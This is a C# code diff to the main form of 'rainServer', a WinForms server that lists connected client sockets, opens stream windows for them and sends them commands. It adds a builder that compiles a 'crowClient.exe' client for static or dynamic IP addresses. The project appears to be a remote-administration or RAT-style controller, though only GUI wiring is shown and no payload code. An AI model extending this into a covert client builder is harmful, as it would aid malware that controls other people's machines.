@@ -14,9 +14,9 @@ using System.Net.Sockets;
 
 namespace rainServer
 {
-    public partial class Form1 : Form, mainWindow
+    public partial class mainForm : Form, mainWindow
     {
-        public Form1()
+        public mainForm()
         {    
             InitializeComponent();          
         }
@@ -24,10 +24,11 @@ namespace rainServer
         public event Action<Socket, streamWindow> streamStart;
         public event Action<int, string, string, string> sendInfo;
         public event Action<ipMode, string> ipEvent;
+        public event Action<compileMode, string, bool, bool, string> compile;
 
         private void dataGridView1_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
         {            
-            Form2 f2 = new Form2();
+            streamForm f2 = new streamForm();
             streamStart((Socket)dataGridView1.CurrentRow.Cells[2].Value, f2);
             f2.Show();            
         }
@@ -44,7 +45,7 @@ namespace rainServer
             string Time = $"time - {disconnectedTime.Hour}:{disconnectedTime.Minute}, data - {disconnectedTime.Day}.{disconnectedTime.Month}.{disconnectedTime.Year}";
             foreach (DataGridViewRow row in dataGridView1.Rows)
             {
-                if (row.Cells["IP"].Value.Equals(ip))
+                if (row.Cells["socet"].Value.Equals(Client))
                 {
                     Invoke(new Action(() => dataGridView1.Rows.RemoveAt(row.Index)));
                     break;
@@ -56,11 +57,14 @@ namespace rainServer
         private void saveLogToolStripMenuItem_Click(object sender, EventArgs e)
         {
             DateTime date = DateTime.Now;
-            string fileName = $"D{date.Day}M{date.Month}Y{date.Year}H{date.Hour}M{date.Minute}.txt";
+            string fileName = $"D{date.Day}M{date.Month}Y{date.Year}H{date.Hour}M{date.Minute}";
             saveFileDialog1.FileName = fileName;
-            if (saveFileDialog1.ShowDialog() == DialogResult.OK)                            
+            saveFileDialog1.Filter = "(*.txt)|*.txt";
+            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
+            {
                 File.WriteAllText(saveFileDialog1.FileName, textBox1.Text);
-            MessageBox.Show($"Файл {fileName} сохранён", "Message");         
+                MessageBox.Show($"File {saveFileDialog1.FileName} is saved", "Message");       
+            }                            
         }
 
         private void sendInfoToClient(string mode, string value)
@@ -153,6 +157,50 @@ namespace rainServer
             pI.ShowDialog();
             if (pI.morfoze)
                 ipEvent?.Invoke(ipMode.setNewIp, pI.getPasswd);
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            ipEvent?.Invoke(ipMode.checkIp, textBox7.Text);
+        }
+
+        private void checkBox3_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox3.Checked)
+            {
+                panel1.Visible = false;
+                panel2.Visible = true;
+            }
+            else
+            {
+                panel1.Visible = true;
+                panel2.Visible = false;
+            }
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            if (checkBox3.Checked ? textBox8.Text != "" : textBox7.Text != "" && textBox9.Text != "")
+                compile?.Invoke(
+                    checkBox3.Checked ? compileMode.staticIP : compileMode.dynamicIP, 
+                    checkBox3.Checked ? textBox8.Text : textBox7.Text, checkBox4.Checked, 
+                    checkBox5.Checked, 
+                    textBox9.Text);
+            else
+                MessageBox.Show("Not all fields are filled :(", "Error!");
+        }
+
+        private void button8_Click(object sender, EventArgs e)
+        {
+            saveFileDialog1.FileName = "crowClient";
+            saveFileDialog1.Filter = "(*.exe)|*.exe";
+            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
+                textBox9.Text = saveFileDialog1.FileName;
+        }
+
+        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            new about().Show();
         }
     }
 }
